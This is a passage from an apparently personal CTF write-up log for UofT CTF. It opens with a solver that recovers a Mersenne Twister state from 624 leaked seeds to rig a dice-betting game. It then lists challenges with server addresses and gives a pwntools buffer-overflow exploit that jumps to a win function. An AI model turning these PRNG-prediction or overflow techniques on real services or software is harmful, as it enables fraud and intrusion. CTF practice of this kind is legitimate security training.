        if len(server_seeds) % 50 == 0 and "Server-Seed" in line:
            print(line.strip())

        if "Server-Seed:" in line:
            match = re.search(r"Server-Seed: (\d+)", line)
            if match:
                server_seeds.append(int(match.group(1)))
        
        if "Final Balance" in line:
            buffer = line # Keep final balance line
            break
    
    print(f"Collected {len(server_seeds)} seeds.")
    if len(server_seeds) != 624:
        print("Error: Did not collect 624 seeds.")
        conn.close()
        return

    # Step 2: Reconstruct PRNG state
    print("Step 2: Reconstructing PRNG state...")
    state_vals = [untemper(y) for y in server_seeds]
    reconstructed_state = (3, tuple(state_vals + [624]), None)
    
    r = random.Random()
    r.setstate(reconstructed_state)
    
    # Current nonce is 624
    nonce = 624
    client_seed = "1337awesome"
    
    # Check current balance
    match = re.search(r"Final Balance: ([\d\.]+)", buffer)
    current_balance = float(match.group(1)) if match else 0
    print(f"Current Balance: {current_balance}")

    # Wait for prompt after game loop
    conn.read_until("> ")

    # Step 3: Win until rich
    while current_balance < 10000:
        # Predict next seed
        next_server_seed = r.getrandbits(32)
        
        # Calculate roll
        roll = calculate_roll(next_server_seed, client_seed, nonce)
        print(f"Predicted next roll (Nonce {nonce}): {roll}")
        
        min_wager = current_balance / 800.0
        # Round min_wager up slightly to avoid float precision issues if server is strict
        # But server uses `wager < self.balance/800`
        
        bet_amount = min_wager
        greed = 98
        
        if roll <= 98:
            bet_amount = current_balance
            greed = max(2, roll)
            print(f"WINNING OPPORTUNITY! Betting {bet_amount} on {greed}")
        else:
            print("Losing roll. Betting minimum.")

        # Execute bet
        conn.send_line("b")
        conn.read_until("Wager per game") 
        conn.read_until(": ")
        conn.send_line(str(bet_amount))
        conn.read_until("Number of games (int): ")
        conn.send_line("1")
        conn.read_until("Enter your number higher or equal to the roll")
        conn.send_line(str(greed))
        conn.read_until("Do you wish to proceed? (Y/N)")
        conn.send_line("Y")
        
        # Read result
        line = conn.read_line() # Game output
        print(line.strip())
        
        while "Final Balance" not in line:
            line = conn.read_line()
            print(line.strip())
            if "Final Balance" in line:
                match = re.search(r"Final Balance: ([\d\.]+)", line)
                if match:
                    current_balance = float(match.group(1))
                    print(f"New Balance: {current_balance}")
                break
        
        conn.read_until("> ")
        nonce += 1
        
        if current_balance >= 10000:
            print("Target balance reached!")
            break

    # Step 4: Buy Flag
    print("Step 4: Buying Flag...")
    conn.send_line("a") # Shop
    conn.read_until("> ")
    conn.send_line("a") # Buy flag
    
    print("Reading flag...")
    while True:
        line = conn.read_line()
        if not line:
            break
        print("OUTPUT LINE:", line.strip())
        if "uoftctf{" in line:
            print("FLAG FOUND:", line.strip())
            break
        if "options:" in line: # Back to menu
            break
            
    conn.close()

if __name__ == "__main__":
    solve()

```

## UofT LFSR Labyrinth | 状态:running｜Reproduction

### 题目描述

A quirky 48-bit UofT stream taps through a WG-flavoured filter, leaving 80 bits of trace and a sealed flag. The blueprint is public; the hidden state is the dance you need to unravel.

### WriteUp

暂无

## MAT247 | 状态:running｜Reproduction

### 题目描述

If V admits a T-cyclic vector, and ST=TS, show that S = p(T) for some polynomial T.

### WriteUp

暂无

## Orca | 状态:running｜Reproduction

### 题目描述

Orcas eat squids :(

​`nc 34.186.247.84 5000`​

### WriteUp

暂无

## Rotor Cipher | 状态:running｜Reproduction

### 题目描述

We captured a rotor cipher, but they destroyed the rotors before we got to it. Can you recover the rotor wiring?

### WriteUp

暂无

## MAT347 | 状态:running｜Reproduction

### 题目描述

Groups, Rings, and Fields. But only groups (and modules!).

​`nc 104.196.21.25 5000`​

### WriteUp

暂无

# Pwn

## Baby bof | 状态:solved｜Live

### 题目描述

People said gets is not safe, but I think I figured out how to make it safe.

​`nc 34.48.173.44 5000`​

### WriteUp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)

if args.REMOTE:
    io = remote('34.48.173.44', 5000)
else:
    io = process(exe)
WIN = elf.symbols['win'] # 0x4011F6
rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]
payload  = b'A' * 7
payload += b'\x00'                     
payload += b'B' * (24 - len(payload))  
payload += p64(RET)                    
payload += p64(WIN)                   

io.recvuntil(b'What is your name')
io.sendline(payload)

io.interactive()

```

## extended-eBPF | 状态:running｜Reproduction

### 题目描述

I extended the eBPF because its cool.

Note: You can log in as the ctf user

​`nc 34.26.243.6 5000`​

### WriteUp

暂无

## Calculator | 状态:running｜Reproduction

### 题目描述

Look at this very simple calculator I implemented in c++.

​`nc 34.162.229.67 5000`​

### WriteUp

暂无

## uprobe | 状态:running｜Reproduction

### 题目描述

uprobes are cool

Note: You can log in as the ctf user

​`nc 136.107.76.27 5000`​

### WriteUp

暂无

## AES AEAD| 状态:running｜Reproduction

### 题目描述

We tried rolling our own crypto. What could possibly go wrong?

​`nc 35.185.46.39 5000`​

### WriteUp

暂无
